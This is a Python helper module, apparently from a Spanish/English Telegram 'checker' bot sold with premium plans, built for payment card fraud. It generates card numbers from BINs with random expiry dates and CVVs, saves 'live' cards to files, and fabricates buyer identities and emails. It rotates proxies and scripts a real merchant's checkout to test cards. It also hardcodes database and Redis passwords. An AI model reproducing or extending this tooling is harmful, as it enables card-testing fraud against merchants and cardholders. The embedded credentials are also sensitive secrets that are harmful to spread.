import os
import time
import random
import string
import re
import json
import requests
import pymongo
import redis
from datetime import datetime
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup

# --- Configuración de bases de datos ---
mongourl = 'mongodb+srv://root:1ikHUYGDhXqAq8Ox@cluster0.unejfbx.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0'
client = pymongo.MongoClient(mongourl, serverSelectionTimeoutMS=5000)
maindb = client["mills"]
users_collection = maindb["users"]
bins_collection = maindb["bins"]

group_not_allowed = "<b>Este grupo no está autorizado para usar el bot</b>"

antidb = redis.Redis(
    host='redis-17574.c10.us-east-1-4.ec2.redns.redis-cloud.com',
    port=17574,
    password='MILUDQruVeqxBoO0G0eLdAP9V45R0td2'
)

BOT_USERNAME = '@SongChk_bot'
loggp = -1002683802090
waste_cards = [1, 2, 7, 8, 9, 0]

# --- Funciones para leer listas ---
def banned_bins():
    with open('files/bannedbin.txt', 'r') as f:
        return [line.strip() for line in f if line.strip()]

def admins():
    with open('files/admins.txt', 'r') as f:
        return [line.strip() for line in f if line.strip()]

def verified_gps():
    with open('files/groups.txt', 'r') as f:
        return [line.strip() for line in f if line.strip()]

# --- Mensajes del sistema ---
use_not_registered = "<b>Register Yourself To Use Me. Hit /register To Register Yourself</b>"
buy_premium = "<b>Take Paid Plan To Use Me In Private Mode. Hit /buy To See My Premium Plans</b>"
free_user = "<b>Buy paid plan to use this gate. Hit /buy to see my premium plans</b>"

# --- Generador de tarjetas ---
ccs = []

def cc_gen(cc, mes='x', ano='x', cvv='x', amount='x'):
    amount = int(amount) if amount != 'x' else 15
    generated = 0
    while generated < amount:
        generated += 1
        result = cc + ''.join(random.choices('0123456789', k=16))
        ccgen = result[:15] if cc[0] == '3' else result[:16]
        mesgen = mes if mes != 'x' else f"{random.randint(1, 12):02d}"
        anogen = ano if ano != 'x' else str(random.randint(2024, 2029))
        cvvgen = cvv if cvv != 'x' else (random.randint(1000, 9999) if cc[0] == '3' else random.randint(100, 999))
        lista = f"{ccgen}|{mesgen}|{anogen}|{cvvgen}\n"
        ccs.append(lista)

# --- Utilidades ---
def make_ordinal(n):
    n = int(n)
    suffix = ['th', 'st', 'nd', 'rd', 'th'][min(n % 10, 4)]
    if 11 <= (n % 100) <= 13:
        suffix = 'th'
    return str(n) + suffix

def lista(dets):
    return re.findall(r'\d+', dets)

def get_email():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=8)) + '@gmail.com'

def get_username():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=8)).capitalize()

def get_time_taken(start_time):
    return f"{time.time() - start_time:.2f}"

def get_part_of_day():
    h = datetime.now().hour
    if h < 12:
        return "Good Morning <b>⛅</b>"
    elif 12 <= h < 16:
        return "Good Afternoon <b>🌣</b>"
    elif 16 <= h < 19:
        return "Good Evening <b>🌅</b>"
    else:
        return "Good Night <b>🌃</b>"

def save_live(lista):
    os.makedirs('files/cvvs', exist_ok=True)
    with open('files/cvvs/cvv.txt', 'a+') as file:
        file.seek(0)
        if str(lista) + "\n" not in file.readlines():
            file.write(str(lista) + "\n")

def save_ccn(lista):
    os.makedirs('files/cvvs', exist_ok=True)
    with open('files/cvvs/ccn.txt', 'a+') as file:
        file.seek(0)
        if str(lista) + "\n" not in file.readlines():
            file.write(str(lista) + "\n")

# --- Encabezados para claves Stripe ---
def sk_headers(sk_key: str) -> dict:
    return {
        "Authorization": f"Bearer {sk_key}",
        "Content-Type": "application/x-www-form-urlencoded",
    }

# --- Generador de usuario aleatorio ---
def random_user():
    try:
        r = requests.get("https://randomuser.me/api/?nat=us&inc=name,location", timeout=10)
        rd = r.json()["results"][0]
        return {
            "first": rd['name']['first'],
            "last": rd['name']['last'],
            "address": f"{rd['location']['street']['number']} {rd['location']['street']['name']}",
            "city": rd['location']['city'],
            "state": rd['location']['state'],
            "zip": rd['location']['postcode'],
        }
    except Exception:
        return {
            "first": "John",
            "last": "Doe",
            "address": "123 Main St",
            "city": "New York",
            "state": "NY",
            "zip": "10001"
        }

# --- Proxy aleatorio desde archivo ---
def get_proxy():
    try:
        with open("files/proxies.txt", "r") as f:
            lines = f.read().splitlines()
            return random.choice(lines) if lines else None
    except Exception:
        return None

# --- Validación principal (ejemplo) ---
def main(cc, mes, ano, cvv):
    req = requests.Session()
    user_data = random_user()
    phone = "225" + ''.join(random.choices("0123456789", k=7))
    email = get_email()
    user = get_username()

    try:
        bin_res = requests.get(f"https://zdgghhhvvdds.herokuapp.com/api/{str(cc)}", timeout=10)
        vendor = bin_res.json().get("data", {}).get("vendor", "").lower()
    except Exception:
        vendor = "unknown"

    headers1 = {
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://buddlycrafts.com',
        'referer': 'https://buddlycrafts.com/checkout/step1/',
        'user-agent': 'Mozilla/5.0'
    }

    try:
        step1 = req.post("https://buddlycrafts.com/checkout/step1/", headers=headers1, data=f"email={user}%40gmail.com", timeout=10)
        match = re.search(r'/checkout/step2/(.*)/', step1.text)
        if not match:
            return None
        cbid = match.group(1)
    except Exception:
        return None

    return {
        'vendor': vendor,
        'cbid': cbid,
        'name': f"{user_data['first']} {user_data['last']}",
        'address': user_data['address'],
        'city': user_data['city'],
        'state': user_data['state'],
        'zip': user_data['zip'],
        'email': email,
        'phone': phone
    }

# --- Teclados inline ---
def build_buttons(items, row_width=2):
    buttons = []
    for i in range(0, len(items), row_width):
        row = [InlineKeyboardButton(item['text'], callback_data=item['callback_data']) for item in items[i:i + row_width]]
        buttons.append(row)
    return InlineKeyboardMarkup(buttons)
